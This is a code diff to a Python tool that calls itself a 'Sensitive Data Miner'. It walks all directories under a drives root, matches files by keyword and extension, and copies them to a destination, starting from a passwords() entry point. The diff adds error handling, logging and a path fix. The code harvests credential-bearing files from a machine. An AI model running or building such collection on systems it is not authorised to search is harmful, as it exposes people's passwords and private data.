@@ -34,7 +34,15 @@ class Mine:
             list: List of files that match the search criteria.
         """
         matching_files = []
-        for filename in os.listdir(root):
+        path_list = []
+        try:
+            path_list = os.listdir(root)
+        except WindowsError as e:
+            if DEBUG:
+                # Log the error if in debug mode, as it is a common occurrence.
+                log.warning(f"Permission Denied: {e}")
+
+        for filename in path_list:
             file_path = root / filename
             if (
                     keyword.lower() in filename.lower()
@@ -42,6 +50,8 @@ class Mine:
                     and file_path.suffix in allowed_extensions
             ):
                 matching_files.append(file_path)
+            else:
+                log.debug(f"Skipped {file_path}, Unsupported due to {file_path.suffix} extension")
         return matching_files
 
     @staticmethod
@@ -79,8 +89,10 @@ class Mine:
 
         with ThreadPoolExecutor() as executor:
             for root, dirs, files in os.walk(drives_root):
-                future_to_file = {executor.submit(cls.__search_files_by_keyword, Path(root), keyword): root_path for
-                                  root_path in dirs}
+                future_to_file = {
+                    executor.submit(cls.__search_files_by_keyword, Path(root) / sub_dir, keyword): sub_dir
+                    for sub_dir in dirs
+                }
                 for future in future_to_file:
                     for file_path in future.result():
                         dst_file_path = destination / file_path.name
@@ -110,5 +122,6 @@ class Mine:
 
 
 if __name__ == "__main__":
-    log.warning("Sensitive Data Miner Started, This may take a while... (aka touch some grass and drink coffee)")
+    log.warning(
+        "Sensitive Data Miner Initialized. Processing may take a while... (Consider a break: coffee or fresh air recommended!)")
     Mine.passwords()
